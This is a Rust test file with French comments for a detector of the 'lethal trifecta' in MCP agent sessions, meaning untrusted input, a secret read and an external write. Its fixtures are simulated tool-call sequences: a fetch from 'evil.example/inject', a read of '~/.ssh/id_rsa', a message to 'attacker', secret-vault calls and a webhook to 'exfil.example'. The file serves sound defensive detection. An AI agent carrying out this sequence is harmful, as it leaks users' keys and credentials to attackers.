//! Tests de la trifecta létale (D4) — 3e jambe « entrée non fiable ».
//!
//! La trifecta (Willison/Invariant) combine sur une même session :
//!   entrée non fiable + lecture secret + écriture externe → CRITIQUE,
//! strictement plus grave que la combinaison 2-jambes existante.
//!
//! On vérifie aussi la NON-régression : l'API 2-jambes (`evaluer_session`,
//! `evaluer_signal`) reste intacte, et un cas bénin n'est PAS flaggé.

use chrono::Utc;
use serde_json::json;
use std::collections::HashMap;

use sentinel_detect::exfiltration::{est_entree_non_fiable, DetecteurExfiltration};
use sentinel_protocol::{Direction, MessageMcp, MethodeMcp, Severite, Transport};
use uuid::Uuid;

fn appel(session: &str, serveur: &str, nom: &str, args: serde_json::Value) -> MessageMcp {
    MessageMcp {
        session_id: session.to_string(),
        transport: Transport::Http,
        serveur: serveur.to_string(),
        direction: Direction::ClientVersServeur,
        methode: MethodeMcp::ToolsCall,
        id_jsonrpc: Some(json!(1)),
        payload: json!({ "params": { "name": nom, "arguments": args } }),
        horodatage: Utc::now(),
    }
}

// ---------------------------------------------------------------------------
// est_entree_non_fiable — classification de la 3e jambe
// ---------------------------------------------------------------------------

#[test]
fn entree_non_fiable_par_nom() {
    let vide = json!({});
    assert!(est_entree_non_fiable("fetch", &vide));
    assert!(est_entree_non_fiable("web_search", &vide));
    assert!(est_entree_non_fiable("browse_web", &vide));
    assert!(est_entree_non_fiable("read_email", &vide));
    assert!(est_entree_non_fiable("scrape_page", &vide));
    // Outil bénin de calcul : pas une entrée non fiable.
    assert!(!est_entree_non_fiable("add_numbers", &vide));
    assert!(!est_entree_non_fiable("list_directory", &vide));
}

#[test]
fn entree_non_fiable_par_payload_url() {
    // Une URL portée par une clé de récupération, sur un outil dont le nom
    // n'est PAS une écriture externe : classé entrée non fiable.
    let args = json!({"url": "https://news.example.com/a"});
    assert!(est_entree_non_fiable("load_resource", &args));
    // En revanche, un outil d'écriture externe portant une URL n'est PAS
    // requalifié en entrée non fiable (évite le faux trifecta).
    let args_hook = json!({"url": "https://hooks.example.com/x", "data": "secret"});
    assert!(!est_entree_non_fiable("webhook", &args_hook));
}

// ---------------------------------------------------------------------------
// Trifecta complète → signal CRITIQUE
// ---------------------------------------------------------------------------

#[test]
fn trifecta_complete_detectee_critique() {
    let messages = vec![
        appel("s1", "web-server", "fetch", json!({"url": "https://evil.example/inject"})),
        appel("s1", "fs-server", "read_file", json!({"path": "~/.ssh/id_rsa"})),
        appel("s1", "notify-server", "send_message", json!({"to": "attacker"})),
    ];

    let signal = DetecteurExfiltration::evaluer_trifecta_signal(&messages, &HashMap::new());
    assert!(signal.is_some(), "les trois jambes doivent déclencher la trifecta");
    let s = signal.unwrap();
    assert_eq!(s.severite, Severite::Critique);
    assert!(!s.entree_non_fiable.is_empty());
    assert!(!s.lecture_secret.is_empty());
    assert!(!s.ecriture_externe.is_empty());
    assert!(s.raison.contains("TRIFECTA"));

    // Constat formel CRITIQUE.
    let constat = DetecteurExfiltration::vers_constat_trifecta(&s, Uuid::new_v4());
    assert_eq!(constat.severite, Severite::Critique);
    assert!(constat.references_conformite.iter().any(|r| r == "SAFE-T1201"));
}

// ---------------------------------------------------------------------------
// 2 jambes seulement → PAS de trifecta, mais l'API 2-jambes reste active
// ---------------------------------------------------------------------------

#[test]
fn deux_jambes_sans_entree_non_fiable_pas_de_trifecta() {
    // Secret + écriture externe, AUCUNE ingestion de contenu non fiable.
    let messages = vec![
        appel("s2", "fs-server", "read_file", json!({"path": "~/.ssh/id_rsa"})),
        appel("s2", "notify-server", "send_message", json!({"to": "ops"})),
    ];

    // Trifecta : non (3e jambe absente).
    assert!(
        DetecteurExfiltration::evaluer_trifecta(&messages).is_none(),
        "sans entrée non fiable, la trifecta ne doit pas se déclencher"
    );
    // 2-jambes : toujours détecté (non-régression de l'API existante).
    assert!(
        DetecteurExfiltration::evaluer_session(&messages).is_some(),
        "l'API 2-jambes existante doit rester intacte"
    );
}

// ---------------------------------------------------------------------------
// Cas BÉNIN : entrée non fiable + écriture, sans lecture de secret → rien
// ---------------------------------------------------------------------------

#[test]
fn cas_benin_pas_de_trifecta_ni_dexfiltration() {
    // Un agent récupère un article public et en poste un résumé : pas de
    // secret lu → ni trifecta, ni exfiltration 2-jambes.
    let messages = vec![
        appel("s3", "web-server", "fetch_news", json!({"url": "https://blog.example/post"})),
        appel("s3", "social-server", "post_summary", json!({"text": "résumé"})),
    ];

    assert!(
        DetecteurExfiltration::evaluer_trifecta(&messages).is_none(),
        "aucune lecture de secret : pas de trifecta (faux positif proscrit)"
    );
    assert!(
        DetecteurExfiltration::evaluer_session(&messages).is_none(),
        "aucune lecture de secret : pas d'exfiltration 2-jambes non plus"
    );
}

// ---------------------------------------------------------------------------
// FAUX POSITIF (régression) : un agent RAG bénin — `fetch` + `extract_keywords`
// (+ `count_tokens`) — ne doit JAMAIS être classé trifecta ni exfiltration.
//
// `est_lecture_secret` matchait auparavant `.*key`/`.*token`/`.*ssh` en
// SOUS-CHAÎNE : `extract_keywords` (« key »), `count_tokens`/`tokenize`
// (« token ») étaient pris pour des lectures de secret. Combinés à `fetch`
// (entrée non fiable + écriture externe), cela fabriquait une TRIFECTA
// CRITIQUE sur un flux de recherche parfaitement bénin.
// ---------------------------------------------------------------------------

#[test]
fn agent_rag_benin_extract_keywords_pas_de_trifecta() {
    let messages = vec![
        appel("rag", "web", "fetch", json!({"url": "https://docs.example/page"})),
        appel("rag", "nlp", "extract_keywords", json!({"text": "contenu"})),
        appel("rag", "nlp", "count_tokens", json!({"text": "contenu"})),
    ];
    assert!(
        DetecteurExfiltration::evaluer_trifecta(&messages).is_none(),
        "extract_keywords/count_tokens ne sont PAS des lectures de secret : pas de trifecta"
    );
    assert!(
        DetecteurExfiltration::evaluer_session(&messages).is_none(),
        "aucune lecture de secret réelle : pas d'exfiltration 2-jambes non plus"
    );
}

// ---------------------------------------------------------------------------
// VRAI POSITIF (non-régression du durcissement) : des noms de secrets RÉELS
// doivent rester détectés malgré le bornage de `key`/`token`/`ssh`.
// ---------------------------------------------------------------------------

#[test]
fn noms_de_secrets_reels_restent_lecture_secret() {
    for nom_secret in ["get_api_key", "read_ssh_key", "fetch_access_token", "get_ssh_key"] {
        let messages = vec![
            appel("s", "fetcher", "fetch", json!({"url": "https://evil.example/i"})),
            appel("s", "vault", nom_secret, json!({})),
            appel("s", "net", "send_message", json!({"to": "x"})),
        ];
        assert!(
            DetecteurExfiltration::evaluer_trifecta(&messages).is_some(),
            "{nom_secret} doit rester classé lecture de secret (trifecta attendue)"
        );
    }
}

// ---------------------------------------------------------------------------
// Sessions distinctes : les jambes ne se cumulent pas entre sessions
// ---------------------------------------------------------------------------

#[test]
fn jambes_reparties_sur_sessions_distinctes_pas_de_trifecta() {
    let messages = vec![
        appel("sa", "web", "fetch", json!({"url": "https://x.example"})),
        appel("sb", "fs", "read_file", json!({"path": "~/.ssh/id_rsa"})),
        appel("sc", "net", "webhook", json!({"url": "https://exfil.example"})),
    ];
    assert!(
        DetecteurExfiltration::evaluer_trifecta(&messages).is_none(),
        "des jambes dans des sessions différentes ne forment pas une trifecta"
    );
}
